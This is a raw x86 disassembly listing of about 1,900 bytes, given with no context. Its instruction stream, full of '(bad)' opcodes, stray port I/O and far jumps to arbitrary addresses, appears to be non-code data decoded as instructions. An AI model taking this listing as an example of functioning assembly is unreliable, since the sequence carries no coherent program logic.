  4039cc:	outs   dx,DWORD PTR ds:[esi]
  4039cd:	in     eax,dx
  4039ce:	sub    al,0xd7
  4039d0:	pop    ss
  4039d1:	ret    0x93ad
  4039d4:	lds    eax,FWORD PTR [ecx+0x367e0775]
  4039da:	bound  edi,QWORD PTR [ebx-0x78]
  4039dd:	jmp    0x403965
  4039df:	dec    ebp
  4039e0:	pop    ds
  4039e1:	sbb    DWORD PTR [eax+edi*8],edx
  4039e4:	sub    al,0x73
  4039e6:	push   edx
  4039e7:	jb     0x403985
  4039e9:	fstp   QWORD PTR cs:[edi]
  4039ec:	mov    ah,0x87
  4039ee:	ret    
  4039ef:	xor    BYTE PTR [ebx],0x73
  4039f2:	outs   dx,BYTE PTR ds:[esi]
  4039f3:	pop    edx
  4039f4:	inc    edx
  4039f5:	dec    esi
  4039f6:	shl    BYTE PTR [esi+0x114e03b8],0xf1
  4039fd:	and    ebp,DWORD PTR [edi-0x587b2d2c]
  403a03:	cs daa 
  403a05:	mov    edi,0xff016a9f
  403a0a:	arpl   WORD PTR [edi+0x3b],cx
  403a0d:	scas   al,BYTE PTR es:[edi]
  403a0e:	or     ah,cl
  403a10:	inc    esi
  403a11:	je     0x403a23
  403a13:	loop   0x4039fb
  403a15:	scas   eax,DWORD PTR es:[edi]
  403a16:	jnp    0x403a06
  403a18:	(bad)  
  403a19:	adc    BYTE PTR [edx-0x8],dl
  403a1c:	sub    al,0xa5
  403a1e:	xchg   edi,eax
  403a1f:	(bad)  
  403a20:	mul    edi
  403a22:	jmp    0xd4b3736
  403a27:	les    edi,FWORD PTR [ebx-0x1c0f2ee7]
  403a2d:	mov    edx,0xbde1b4db
  403a32:	adc    ecx,DWORD PTR [edi]
  403a34:	jae    0x4039bc
  403a36:	adc    bl,bl
  403a38:	int    0x3b
  403a3a:	test   BYTE PTR [esi],dl
  403a3c:	and    edx,DWORD PTR [eax+0x23]
  403a3f:	adc    al,0x7e
  403a41:	inc    ecx
  403a42:	dec    ebp
  403a43:	cs loope 0x4039e4
  403a46:	loop   0x4039ff
  403a48:	not    DWORD PTR [ecx-0x175a0890]
  403a4e:	sub    ecx,DWORD PTR [ecx+eiz*4]
  403a51:	jg     0x403a41
  403a53:	into   
  403a54:	mov    ecx,DWORD PTR [eax]
  403a56:	mov    DWORD PTR [ebx-0x2e],eax
  403a59:	push   eax
  403a5a:	jne    0x403aa8
  403a5c:	inc    esi
  403a5d:	inc    ecx
  403a5e:	loope  0x403ab2
  403a60:	jmp    0x1875ae91
  403a65:	or     eax,0x321ef604
  403a6a:	dec    esi
  403a6b:	out    dx,al
  403a6c:	push   ss
  403a6d:	jle    0x403a6a
  403a6f:	mov    esi,0x82d6a537
  403a74:	ds loopne 0x403aeb
  403a77:	xor    eax,DWORD PTR [esi+0x18f5ff87]
  403a7d:	(bad)  
  403a7e:	repz cli 
  403a80:	xchg   ebx,eax
  403a81:	stc    
  403a82:	inc    edi
  403a83:	aad    0x86
  403a85:	lock sub BYTE PTR [eax],cl
  403a88:	in     al,dx
  403a89:	inc    ecx
  403a8a:	pop    ebx
  403a8b:	mov    edi,0xa7449b9d
  403a90:	pop    ecx
  403a91:	les    ecx,FWORD PTR [ecx]
  403a93:	and    DWORD PTR [edi],esp
  403a95:	lock mov ds:0x17eab2d9,eax
  403a9b:	popf   
  403a9c:	pushf  
  403a9d:	ror    BYTE PTR [eax-0xa],cl
  403aa0:	xchg   ebp,eax
  403aa1:	or     ch,BYTE PTR [eax+0xf08540f]
  403aa7:	(bad)  
  403aa8:	data16 cmp ah,dh
  403aab:	xor    ah,BYTE PTR [edi+0x59]
  403aae:	mov    bl,0xfa
  403ab0:	sbb    eax,0x45382dfd
  403ab5:	(bad)
  403ab8:	mov    esp,DWORD PTR [ebp+ebp*4-0x73]
  403abc:	add    al,0x28
  403abe:	fisub  WORD PTR [edx+ebx*2]
  403ac1:	aam    0x37
  403ac3:	fmul   DWORD PTR [ecx+0x350447de]
  403ac9:	pop    DWORD PTR [ebx+0x18]
  403acc:	into   
  403acd:	jne    0x403a54
  403acf:	mov    eax,ds:0xeb99412e
  403ad4:	xor    al,0x61
  403ad6:	aam    0xcb
  403ad8:	in     eax,0x80
  403ada:	mov    al,0xbc
  403adc:	sbb    eax,0x23c8805b
  403ae1:	push   esi
  403ae2:	mov    bl,0x3c
  403ae4:	popf   
  403ae5:	mov    ds:0xe3343672,eax
  403aea:	inc    edi
  403aeb:	ss inc eax
  403aed:	aad    0x1f
  403aef:	ss cmp al,0xa1
  403af2:	data16 es (bad) 
  403af5:	jmp    0x403b14
  403af7:	add    ecx,ebx
  403af9:	jmp    0x4a4e43ef
  403afe:	in     eax,0x93
  403b00:	sub    DWORD PTR [ecx],edi
  403b02:	lods   al,BYTE PTR ds:[esi]
  403b03:	or     eax,0x95d0b55e
  403b08:	inc    ebp
  403b09:	add    cl,BYTE PTR [ecx+0x76]
  403b0c:	mov    ch,0x7d
  403b0e:	pop    edi
  403b0f:	in     eax,0x17
  403b11:	mov    esi,ecx
  403b13:	inc    esi
  403b14:	xchg   BYTE PTR [edi+0x73],ch
  403b17:	je     0x403b67
  403b19:	push   ebp
  403b1a:	xlat   BYTE PTR ds:[ebx]
  403b1b:	mov    eax,0x9e7c74b1
  403b20:	and    al,0xb6
  403b22:	loopne 0x403b7c
  403b24:	aas    
  403b25:	mov    esp,0x431aded0
  403b2a:	shl    esp,1
  403b2c:	cs jp  0x403bac
  403b2f:	mov    cl,dh
  403b31:	outs   dx,BYTE PTR ds:[esi]
  403b32:	sbb    BYTE PTR [ebx],cl
  403b34:	xchg   ebp,eax
  403b35:	push   ss
  403b36:	xchg   ebx,ebp
  403b38:	sbb    eax,0xb914252d
  403b3d:	js     0x403af8
  403b3f:	xchg   DWORD PTR [edi+0x72],ebx
  403b42:	jecxz  0x403b7f
  403b44:	(bad)  
  403b45:	fstp   DWORD PTR [edx]
  403b47:	dec    eax
  403b48:	enter  0x5eac,0x4
  403b4c:	sar    BYTE PTR [esi+eax*8-0x14189a14],1
  403b53:	or     al,0xa6
  403b55:	arpl   di,sp
  403b57:	mov    edi,0x3fd341d3
  403b5c:	aas    
  403b5d:	dec    esp
  403b5e:	sbb    ah,al
  403b60:	adc    ebx,esp
  403b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b63:	fsub   st,st(7)
  403b65:	add    esp,DWORD PTR [eax+0x6f]
  403b68:	xchg   edx,eax
  403b69:	sub    eax,0x64a38bfa
  403b6e:	loope  0x403b6d
  403b70:	inc    ebp
  403b71:	xchg   edx,eax
  403b72:	jae    0x403b15
  403b74:	icebp  
  403b75:	xor    esp,ebp
  403b77:	shl    BYTE PTR [edi+ebx*4],cl
  403b7a:	mov    eax,ds:0x337f8914
  403b7f:	or     eax,0x881323bd
  403b84:	and    ebx,DWORD PTR ds:0x1b572ad6
  403b8a:	or     bl,BYTE PTR [edx+0x770c07c7]
  403b90:	(bad)  
  403b91:	imul   edi,ebp,0xffffffb0
  403b94:	(bad)  
  403b98:	sbb    ebx,DWORD PTR [eax]
  403b9a:	clc    
  403b9b:	push   edx
  403b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b9d:	add    edx,ebx
  403b9f:	and    eax,0x61dd0c10
  403ba4:	inc    eax
  403ba5:	pop    ds
  403ba6:	jmp    0xc9475203
  403bab:	jbe    0x403b91
  403bad:	mov    edx,0x11b3dda9
  403bb2:	xchg   esp,eax
  403bb3:	add    ch,bl
  403bb5:	push   ecx
  403bb6:	cli    
  403bb7:	int    0x5f
  403bb9:	sbb    eax,DWORD PTR [ecx+edi*4]
  403bbc:	rol    DWORD PTR [esi-0x4d],cl
  403bbf:	les    ecx,FWORD PTR [esi-0x50]
  403bc2:	adc    DWORD PTR [eax+edi*8-0x3ede2d51],edi
  403bc9:	push   es
  403bca:	repnz dec eax
  403bcc:	jne    0x403b89
  403bce:	scas   eax,DWORD PTR es:[edi]
  403bcf:	rol    edx,cl
  403bd1:	rcr    BYTE PTR [ecx],1
  403bd3:	ror    ecx,cl
  403bd5:	jl     0x403b70
  403bd7:	pop    eax
  403bd8:	adc    DWORD PTR [edi+0x65d0723],ebp
  403bde:	imul   ebx,DWORD PTR [edi-0x35],0xe383283c
  403be5:	cli    
  403be6:	les    ebx,FWORD PTR [edx+0x29]
  403be9:	outs   dx,DWORD PTR ds:[esi]
  403bea:	(bad)  
  403beb:	clc    
  403bec:	(bad)  
  403bed:	out    dx,al
  403bee:	repnz add DWORD PTR [edi+ebx*8],ebp
  403bf2:	jae    0x403c4f
  403bf4:	pop    ebp
  403bf5:	into   
  403bf6:	retf   0x6803
  403bf9:	push   edi
  403bfa:	xlat   BYTE PTR ds:[ebx]
  403bfb:	dec    esi
  403bfc:	push   ds
  403bfd:	cwde   
  403bfe:	push   esp
  403bff:	lock cmp eax,edx
  403c02:	mov    ds:0xe09cce27,al
  403c07:	mov    ds,WORD PTR [esi+0x35763823]
  403c0d:	add    bh,BYTE PTR fs:[eax-0x37]
  403c11:	cmp    al,0xfe
  403c13:	jge    0x403b97
  403c15:	neg    DWORD PTR ds:0xdc97b029
  403c1b:	add    bl,BYTE PTR [esi]
  403c1d:	lock hlt 
  403c1f:	and    bl,dl
  403c21:	jg     0x403bce
  403c23:	mov    eax,ds:0xd214063
  403c28:	and    DWORD PTR [ebx+0x1e5e1aad],0xfffffff0
  403c2f:	fldcw  WORD PTR [edi+edx*8-0x2504de09]
  403c36:	sahf   
  403c37:	sbb    eax,0xe0db42a7
  403c3c:	sub    edx,eax
  403c3e:	and    al,0xff
  403c40:	lea    esp,[ebp-0x52]
  403c43:	push   ds
  403c44:	jmp    0x823a:0xc826f940
  403c4b:	ret    0x9191
  403c4e:	fsubr  QWORD PTR [esi-0x38]
  403c51:	nop
  403c52:	fst    st(2)
  403c54:	jno    0x403c60
  403c56:	and    dl,BYTE PTR [ecx-0x35]
  403c59:	repnz pop edx
  403c5b:	fistp  DWORD PTR [edi]
  403c5d:	dec    edi
  403c5e:	add    esp,DWORD PTR [eax+0x23a950ea]
  403c64:	xor    ebx,DWORD PTR [ebx+0x52]
  403c67:	dec    edi
  403c68:	inc    edi
  403c69:	pop    ecx
  403c6a:	and    ecx,DWORD PTR [ecx+0x31321af2]
  403c70:	push   eax
  403c71:	xchg   esp,eax
  403c72:	jo     0x403c60
  403c74:	popa   
  403c75:	xchg   edx,eax
  403c76:	loope  0x403c67
  403c78:	xchg   edx,eax
  403c79:	cmc    
  403c7a:	cmp    ah,BYTE PTR [eax]
  403c7c:	jbe    0x403c09
  403c7e:	push   ebx
  403c7f:	mov    ebp,0xc5644c0e
  403c84:	xor    al,0xaa
  403c86:	ret    
  403c87:	call   FWORD PTR [esi+0x18aec22a]
  403c8d:	(bad)  
  403c8e:	pop    ebp
  403c8f:	sub    BYTE PTR [ebx],ah
  403c91:	ja     0x403c7c
  403c93:	ficomp DWORD PTR [ebx+0x3f9a223d]
  403c99:	add    dl,ah
  403c9b:	ret    
  403c9c:	sti    
  403c9d:	lds    esp,FWORD PTR [edi-0x53]
  403ca0:	adc    ebx,esp
  403ca2:	jne    0x403c96
  403ca4:	call   0xba3c:0xd2b8e014
  403cab:	mov    BYTE PTR [edx],ah
  403cad:	fisub  DWORD PTR [eax]
  403caf:	mov    edx,0x3d6889f7
  403cb4:	das    
  403cb5:	xor    al,0xa8
  403cb7:	sbb    WORD PTR [edx],di
  403cba:	popa   
  403cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cbc:	ss popf 
  403cbe:	jnp    0x403cb9
  403cc0:	lds    esp,FWORD PTR [ebx]
  403cc2:	xlat   BYTE PTR ds:[ebx]
  403cc3:	fidivr WORD PTR [esi+0x7502124]
  403cc9:	shl    DWORD PTR [ebp-0xe],cl
  403ccc:	sar    DWORD PTR [edi],cl
  403cce:	sar    DWORD PTR [ebp+ecx*2+0x1f3970a9],0xe1
  403cd6:	mov    ds:0x2dbeafea,al
  403cdb:	ja     0x403c6f
  403cdd:	adc    al,BYTE PTR [ebx+0x38]
  403ce0:	(bad)  
  403ce1:	jno    0x403c7a
  403ce3:	loop   0x403d05
  403ce5:	loop   0x403d4e
  403ce7:	add    BYTE PTR [ebp+eax*2+0x6e3c95c6],0x95
  403cef:	mov    dh,0x1d
  403cf1:	jmp    0x6fc57194
  403cf6:	inc    edi
  403cf7:	test   BYTE PTR [edi+0x3a],0x8e
  403cfb:	popa   
  403cfc:	sbb    edi,DWORD PTR [ecx]
  403cfe:	jnp    0x403cdb
  403d00:	aad    0x2d
  403d02:	rol    DWORD PTR [edx+0x7f],cl
  403d05:	nop
  403d06:	add    DWORD PTR [ebx],edi
  403d08:	xchg   edi,eax
  403d09:	test   BYTE PTR [eax-0x3325bf3e],ch
  403d0f:	pop    ebx
  403d10:	pop    ebp
  403d11:	pop    ss
  403d12:	pop    edi
  403d13:	push   ebp
  403d14:	fistp  WORD PTR [ebp-0x40]
  403d17:	dec    di
  403d19:	mov    al,0x87
  403d1b:	and    BYTE PTR [ecx-0x6e],cl
  403d1e:	jmp    0xc878b886
  403d23:	jge    0x403cc4
  403d25:	imul   ecx,DWORD PTR [bx+di],0x6711ad57
  403d2c:	inc    edi
  403d2d:	rcl    DWORD PTR ds:0xf7a80f0f,0xa6
  403d34:	ss iret 
  403d36:	mov    ah,0x53
  403d38:	dec    edi
  403d39:	inc    esp
  403d3a:	pop    esp
  403d3b:	outs   dx,DWORD PTR ds:[esi]
  403d3c:	or     esi,0x34fb6971
  403d42:	das    
  403d43:	or     ah,dl
  403d45:	xor    BYTE PTR ds:0x8bbc2c98,ch
  403d4b:	fist   DWORD PTR [edi+0x24]
  403d4e:	jns    0x403cdc
  403d50:	out    0x26,eax
  403d52:	call   0xa34a:0xe36d8f9f
  403d59:	in     al,0xb5
  403d5b:	mov    WORD PTR [edi],?
  403d5d:	xor    DWORD PTR [eax+0x9],eax
  403d60:	retf   0x942a
  403d63:	xor    DWORD PTR ds:0x26a0b948,eax
  403d69:	jle    0x403dde
  403d6b:	repnz (bad) 
  403d6d:	xchg   ebx,eax
  403d6e:	ins    DWORD PTR es:[edi],dx
  403d6f:	pop    eax
  403d70:	or     al,0x94
  403d72:	cmp    bh,BYTE PTR [ecx-0x5c]
  403d75:	js     0x403d5f
  403d77:	jmp    0x6162:0xba797b46
  403d7e:	mov    cl,BYTE PTR [eax-0x1]
  403d81:	out    0xf6,al
  403d83:	dec    esp
  403d84:	push   esi
  403d85:	push   edx
  403d86:	push   ds
  403d87:	jle    0x403d77
  403d89:	push   ebx
  403d8a:	cmp    bh,al
  403d8c:	loopne 0x403d55
  403d8e:	sbb    eax,0x502a4cb
  403d93:	pop    ebx
  403d94:	sub    BYTE PTR [esp+0x1366b3a6],cl
  403d9b:	mov    cl,0x71
  403d9d:	push   0xf26bde3a
  403da2:	xor    ch,bl
  403da4:	jmp    0x403da8
  403da6:	fwait
  403da7:	or     esi,DWORD PTR [ebx]
  403da9:	rol    BYTE PTR [ecx+0x4229522d],0x0
  403db0:	scas   eax,DWORD PTR es:[edi]
  403db1:	add    DWORD PTR [eax],eax
  403db3:	add    BYTE PTR [ebx],cl
  403db5:	shl    edi,0x15
  403db8:	mov    dh,0x29
  403dba:	inc    edx
  403dbb:	add    cl,ch
  403dbd:	test   DWORD PTR ds:0x7a360000,eax
  403dc3:	daa    
  403dc4:	cmp    bl,BYTE PTR [ebx]
  403dc6:	sbb    ch,BYTE PTR [edx]
  403dc8:	pop    edx
  403dc9:	pop    es
  403dca:	scas   al,BYTE PTR es:[edi]
  403dcb:	and    ch,BYTE PTR [eax-0x20]
  403dce:	lods   al,BYTE PTR ds:[esi]
  403dcf:	mov    eax,0x16c55872
  403dd4:	push   ss
  403dd5:	cmp    eax,0x2a161604
  403dda:	addr16 fcomp QWORD PTR [di]
  403dde:	cmp    eax,0x59625ce7
  403de3:	shr    esi,0x56
  403de6:	mov    ebx,0x4b7882d8
  403deb:	clc    
  403dec:	jecxz  0x403e35
  403dee:	gs jb  0x403e5f
  403df1:	popf   
  403df2:	adc    al,BYTE PTR [ecx+ecx*8+0x15]
  403df6:	pop    edx
  403df7:	sub    dl,al
  403df9:	sbb    DWORD PTR [ecx-0x56],ecx
  403dfc:	ja     0x403e77
  403dfe:	jp     0x403e09
  403e00:	ja     0x403e2f
  403e02:	jp     0x403e09
  403e04:	mov    dh,0x2f
  403e06:	xor    al,bl
  403e08:	addr16 aas 
  403e0a:	xchg   esp,eax
  403e0b:	jl     0x403e16
  403e0d:	mov    esi,0xf872c43e
  403e12:	xor    edx,ecx
  403e14:	test   DWORD PTR [ecx+esi*4+0x5f],ecx
  403e18:	xlat   BYTE PTR ds:[ebx]
  403e19:	or     al,0x9e
  403e1b:	leave  
  403e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e1d:	cmp    ah,al
  403e1f:	inc    eax
  403e20:	sub    ecx,DWORD PTR [edx]
  403e22:	inc    esp
  403e23:	repz daa 
  403e25:	sub    eax,0xcaf07bf
  403e2a:	dec    ecx
  403e2b:	repnz shl bh,cl
  403e2e:	enter  0xe441,0xfc
  403e32:	(bad)
  403e35:	aaa    
  403e36:	xchg   esp,eax
  403e37:	adc    esi,DWORD PTR [eax]
  403e39:	inc    ebp
  403e3a:	or     bh,ch
  403e3c:	fsubr  QWORD PTR [edi-0x20]
  403e3f:	mov    ebx,0xf4d9eb69
  403e44:	fild   WORD PTR [edx-0x2a]
  403e47:	jae    0x403df4
  403e49:	sub    dl,dl
  403e4b:	and    edx,DWORD PTR [edx]
  403e4d:	sahf   
  403e4e:	inc    esi
  403e4f:	pop    edx
  403e50:	jo     0x403de7
  403e52:	mov    bl,ah
  403e54:	jb     0x403dd8
  403e56:	dec    edx
  403e57:	add    eax,0x1a8f993
  403e5c:	push   esi
  403e5d:	fstp   TBYTE PTR [edx-0x59]
  403e60:	and    DWORD PTR [esi-0x6599f326],edx
  403e66:	gs mul bh
  403e69:	mov    eax,ds:0x23d14145
  403e6e:	mov    ecx,0xe60f737
  403e73:	jbe    0x403e2e
  403e75:	(bad)  
  403e76:	sbb    ah,BYTE PTR [eax+0x55919790]
  403e7c:	push   edi
  403e7d:	test   ch,dh
  403e7f:	jb     0x403ea3
  403e81:	sbb    al,0xbe
  403e83:	into   
  403e84:	in     eax,0x92
  403e86:	pop    esi
  403e87:	(bad)  
  403e88:	fucomp st(4)
  403e8a:	add    DWORD PTR [edx],esi
  403e8c:	lahf   
  403e8d:	mov    edi,0xa7b494ff
  403e92:	test   esi,esp
  403e94:	cdq    
  403e95:	fwait
  403e96:	and    DWORD PTR [ebp-0x788c1d74],0x17d4c71
  403ea0:	pop    edi
  403ea1:	pop    esp
  403ea2:	(bad)  
  403ea4:	sbb    al,BYTE PTR [ecx+0x27701a54]
  403eaa:	jp     0x403ed0
  403eac:	stos   DWORD PTR es:[edi],eax
  403ead:	xchg   esi,eax
  403eae:	sub    bl,0xcf
  403eb1:	or     bl,cl
  403eb3:	out    0xd4,eax
  403eb5:	sub    DWORD PTR [esi],esp
  403eb7:	mov    ecx,0x4b0157ff
  403ebc:	loope  0x403f32
  403ebe:	popf   
  403ebf:	rep stos DWORD PTR es:[edi],eax
  403ec1:	jge    0x403e5b
  403ec3:	xchg   DWORD PTR [esi-0x1e],ebp
  403ec6:	loope  0x403f11
  403ec8:	mov    esp,edi
  403eca:	into   
  403ecb:	xchg   esp,eax
  403ecc:	push   es
  403ecd:	mov    al,ds:0x1708086f
  403ed2:	int    0x18
  403ed4:	(bad)  
  403ed5:	sbb    bl,BYTE PTR [ebx+0x14]
  403ed8:	in     eax,dx
  403ed9:	in     al,dx
  403eda:	sar    BYTE PTR [ebx+0x4c],0x88
  403ede:	fstp   QWORD PTR [edi-0x39]
  403ee1:	xchg   ebx,eax
  403ee2:	inc    edx
  403ee3:	mov    WORD PTR [edi+0x34],es
  403ee6:	ins    DWORD PTR es:[edi],dx
  403ee7:	push   esp
  403ee8:	pop    esp
  403ee9:	fistp  QWORD PTR [edx+esi*8]
  403eec:	cs int3 
  403eee:	push   edx
  403eef:	xchg   edi,eax
  403ef0:	pop    esp
  403ef1:	in     al,0xdf
  403ef3:	xchg   esi,eax
  403ef4:	dec    esp
  403ef5:	pop    edx
  403ef6:	ja     0x403f6b
  403ef8:	fisub  WORD PTR [ebx+edx*1]
  403efb:	pop    ecx
  403efc:	dec    ebx
  403efd:	inc    eax
  403efe:	inc    esi
  403eff:	push   es
  403f00:	outs   dx,BYTE PTR ds:[esi]
  403f01:	or     ebx,DWORD PTR [esi]
  403f03:	mov    bh,0x79
  403f05:	je     0x403f0f
  403f07:	data16 sbb al,0x75
  403f0a:	(bad)  
  403f0b:	sub    ebp,DWORD PTR [edi+0x20]
  403f0e:	jmp    0x77c9:0xceafb0d9
  403f15:	lock sub DWORD PTR [eax],0xfffffff7
  403f19:	imul   eax,ebp,0xd79baf09
  403f1f:	mov    edx,DWORD PTR [edx-0x2]
  403f22:	push   esi
  403f23:	scas   eax,DWORD PTR es:[edi]
  403f24:	push   es
  403f25:	fnstenv [eax-0x56]
  403f28:	push   es
  403f29:	aad    0x47
  403f2b:	xchg   DWORD PTR [ebp+0x74],eax
  403f2e:	xchg   esi,eax
  403f2f:	hlt    
  403f30:	in     al,0x9b
  403f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f33:	in     al,0x95
  403f35:	ja     0x403ee2
  403f37:	imul   ebp,esi,0xffffffad
  403f3a:	call   0x8c01:0x66753039
  403f41:	jge    0x403ee2
  403f43:	and    al,bh
  403f45:	loop   0x403ec7
  403f47:	lock fiadd WORD PTR [edi]
  403f4a:	fcomp  QWORD PTR [edx+0x5f31a6c1]
  403f50:	push   0xb7c932
  403f55:	mov    dl,0xaa
  403f57:	test   al,0xc1
  403f59:	dec    edx
  403f5a:	aas    
  403f5b:	shl    DWORD PTR [ebp+eiz*8-0x4d6984bf],0xf9
  403f63:	retf   0xbd89
  403f66:	es mov ch,0xa1
  403f69:	fdivr  QWORD PTR [edi]
  403f6b:	shr    dl,cl
  403f6d:	pop    ds
  403f6e:	ret    
  403f6f:	stos   BYTE PTR es:[edi],al
  403f70:	bound  esp,QWORD PTR [ebx+0x1]
  403f73:	pushf  
  403f74:	inc    eax
  403f75:	pushf  
  403f76:	pop    ecx
  403f77:	pop    eax
  403f78:	out    0x22,eax
  403f7a:	mov    ebp,0x1965d177
  403f7f:	push   es
  403f80:	xchg   ebx,eax
  403f81:	in     eax,dx
  403f82:	repnz xor BYTE PTR [eax],ch
  403f85:	pop    eax
  403f86:	and    BYTE PTR [ebx+0x48],dh
  403f89:	daa    
  403f8a:	test   DWORD PTR [edx],ebp
  403f8c:	and    al,0x1f
  403f8e:	cld    
  403f8f:	push   esp
  403f90:	jb     0x403fe4
  403f92:	push   ebp
  403f93:	xchg   ecx,eax
  403f94:	data16 add cl,BYTE PTR [eax-0x6a22b77f]
  403f9b:	xor    al,0xea
  403f9d:	mov    ecx,edx
  403f9f:	cld    
  403fa0:	adc    bh,bh
  403fa2:	jmp    0xac2:0xf60cce68
  403fa9:	jecxz  0x403f63
  403fab:	add    dh,bh
  403fad:	mov    DWORD PTR [ecx+eax*8-0x2c],ebx
  403fb1:	mov    ecx,ebp
  403fb3:	mov    ch,0x43
  403fb5:	add    eax,0xdaf6a377
  403fba:	cmp    ch,ch
  403fbc:	sub    eax,0xda46eb34
  403fc1:	sahf   
  403fc2:	xor    cl,bh
  403fc4:	xor    DWORD PTR [edi+0x41],eax
  403fc7:	sub    dl,al
  403fc9:	scas   eax,DWORD PTR es:[edi]
  403fca:	cmp    BYTE PTR [ebp-0x57b7e3f0],ah
  403fd0:	mov    eax,ds:0x62c0eaa5
  403fd5:	inc    eax
  403fd6:	and    ecx,ecx
  403fd8:	push   0x47175669
  403fdd:	jmp    0x31dda838
  403fe2:	jecxz  0x403feb
  403fe4:	dec    ebp
  403fe5:	scas   eax,DWORD PTR es:[edi]
  403fe6:	fmul   st,st(5)
  403fe8:	hlt    
  403fe9:	shl    BYTE PTR [ecx-0x32],0xba
  403fed:	aad    0x86
  403fef:	dec    esi
  403ff0:	fiadd  DWORD PTR [edx]
  403ff2:	xchg   edi,eax
  403ff3:	repz adc dh,BYTE PTR [edx-0x6732989]
  403ffa:	ss jb  0x404069
  403ffd:	xor    ch,BYTE PTR [esi+0x96ff606]
  404003:	add    dl,BYTE PTR [edi+0x424cac8a]
  404009:	cmp    eax,0xd464877d
  40400e:	jnp    0x403fb9
  404010:	xchg   esp,eax
  404011:	inc    ax
  404013:	in     eax,dx
  404014:	pop    esi
  404015:	xchg   ebp,eax
  404016:	push   ss
  404017:	int    0xab
  404019:	inc    edi
  40401a:	push   es
  40401b:	mov    al,0x5e
  40401d:	cmp    ebp,DWORD PTR [edi]
  40401f:	pop    ebp
  404020:	jne    0x404053
  404022:	pop    ds
  404023:	out    0x38,eax
  404025:	leave  
  404026:	leave  
  404027:	and    BYTE PTR [eax],dl
  404029:	jecxz  0x403fd0
  40402b:	loop   0x403fff
  40402d:	sub    al,dh
  40402f:	iret   
  404030:	idiv   BYTE PTR [ebp-0x68cc67e8]
  404036:	pop    esp
  404037:	push   ecx
  404038:	push   esi
  404039:	iret   
  40403a:	cdq    
  40403b:	and    eax,0x44e7b4a0
  404040:	jg     0x4040aa
  404042:	xor    BYTE PTR [esi+eax*8],ch
  404045:	xchg   esp,eax
  404046:	sbb    BYTE PTR [edx+0x5febf1ff],0xa0
  40404d:	stos   DWORD PTR es:[edi],eax
  40404e:	dec    ecx
  40404f:	pop    ss
  404050:	push   es
  404051:	mov    dh,0x9a
  404053:	xchg   esi,eax
  404054:	cmp    bh,BYTE PTR [ebx+0x7f]
  404057:	loope  0x404095
  404059:	es loope 0x404050
  40405c:	inc    edx
  40405d:	fucomp st(7)
  40405f:	xchg   esi,eax
  404060:	inc    edx
  404061:	and    esp,DWORD PTR ds:[ecx]
  404064:	and    eax,0x5b63c6bb
  404069:	mov    edx,0xe4943c1b
  40406e:	rol    DWORD PTR [edi-0x4c75dc4b],0x5f
  404075:	je     0x4040ac
  404077:	stos   DWORD PTR es:[edi],eax
  404078:	scas   eax,DWORD PTR es:[edi]
  404079:	call   FWORD PTR [ecx]
  40407b:	xor    bl,bh
  40407d:	dec    edi
  40407e:	jnp    0x4040b1
  404080:	imul   eax,DWORD PTR [esp+eiz*2+0x79],0xd7ec333a
  404088:	cmp    bl,0x71
  40408b:	or     BYTE PTR [esp+esi*8],al
  40408e:	mov    DWORD PTR [esi-0x33],esp
  404091:	xchg   esp,eax
  404092:	dec    esp
  404093:	aam    0x53
  404095:	xor    al,0xcf
  404097:	mov    bl,0x43
  404099:	mov    edi,0x34dd4e2d
  40409e:	mov    esp,0x3c8b337b
  4040a3:	mov    esi,ebp
  4040a5:	sbb    al,0x76
  4040a7:	mov    ebp,ss
  4040a9:	sbb    DWORD PTR [ecx],ebx
  4040ab:	sti    
  4040ac:	fs jnp 0x40404c
  4040af:	inc    edx
  4040b0:	repnz xchg ecx,eax
  4040b2:	dec    ebx
  4040b3:	and    eax,0x78aed38
  4040b8:	cs call 0x4c96:0x5d49204e
  4040c0:	ja     0x404071
  4040c2:	(bad)
  4040c5:	cmp    BYTE PTR [eax-0x1222a477],ch
  4040cb:	enter  0xee42,0x14
  4040cf:	fs pop edx
  4040d1:	add    BYTE PTR [eax+0x74],dl
  4040d4:	cmc    
  4040d5:	outs   dx,BYTE PTR ds:[esi]
  4040d6:	adc    eax,0xa0233978
  4040db:	adc    dl,BYTE PTR [ebx+0xb855c63]
  4040e1:	scas   eax,DWORD PTR es:[edi]
  4040e2:	rol    BYTE PTR [edi+0xa70bddc],0x21
  4040e9:	scas   al,BYTE PTR es:[edi]
  4040ea:	or     ch,BYTE PTR [ebx]
  4040ec:	mov    dh,0xf6
  4040ee:	push   ecx
  4040ef:	leave  
  4040f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f1:	and    al,0x1b
  4040f3:	cwde   
  4040f4:	imul   ecx,DWORD PTR [edx-0x2d334b47],0xf5cdbdcb
  4040fe:	loopne 0x404104
  404100:	inc    ecx
  404101:	pop    ebp
  404102:	inc    esp
  404103:	sub    esp,DWORD PTR [bx]
  404106:	push   edx
  404107:	out    0xaa,al
  404109:	lds    edx,FWORD PTR ds:0xa2df8a0d
  40410f:	int3   
  404110:	scas   al,BYTE PTR es:[edi]
  404111:	pop    ecx
  404112:	push   ebp
  404113:	xchg   esp,ecx
  404115:	sbb    esi,ebp
  404117:	rol    BYTE PTR [ecx-0x177f98ea],1
  40411d:	jo     0x404126
  40411f:	mov    ebp,0x120fb9c1
  404124:	pop    esp
  404125:	test   DWORD PTR [ecx-0x5cf0967a],edx
  40412b:	pop    ecx
  40412c:	mov    bl,0xac
  40412e:	adc    eax,0x4578292d
  404133:	add    edi,edx
  404135:	int    0x72
  404137:	jnp    0x404195
  404139:	jmp    0xa417ab33
  40413e:	mov    bl,0x88
  404140:	or     al,0x33
  404142:	in     al,0x3e
  404144:	jmp    0x40415c
  404146:	test   ch,bh
  404148:	sbb    esp,DWORD PTR [edx-0x24]
  40414b:	push   cs
  40414c:	cmp    BYTE PTR [ebx+0x6b],dh
  40414f:	retf   
  404150:	cs pop ss
  404152:	add    eax,0x101bc297
  404157:	push   esp
  404158:	dec    esp
  404159:	jbe    0x404162
  40415b:	outs   dx,DWORD PTR ds:[esi]
  40415c:	fiadd  WORD PTR [edi]
  40415e:	daa    
  40415f:	and    eax,0x5bc13a47
  404164:	repnz sub dh,cl
  404167:	iret   
  404168:	inc    edi
  404169:	(bad)  
  40416b:	adc    dh,BYTE PTR [edi+0x77bba4bd]
